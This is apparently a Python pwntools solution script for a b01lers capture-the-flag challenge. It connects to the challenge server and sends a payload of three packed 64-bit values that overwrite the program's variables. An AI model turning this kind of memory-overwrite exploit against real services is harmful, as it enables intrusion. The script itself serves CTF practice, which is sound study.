from pwn import *
p  = remote('pwn.ctf.b01lers.com', 1001)
nas_input = 0x5641444c4f4f42
overrite1 = 0x1052949205934053
overrite2 = 0x1004d5d649dc0f11
 
print p.recvuntil(" > ")
payload = ""
payload += p64(nas_input)
payload += p64(overrite1)
payload += p64(overrite2)

p.sendline(payload)
print p.recvline()
print p.recvline()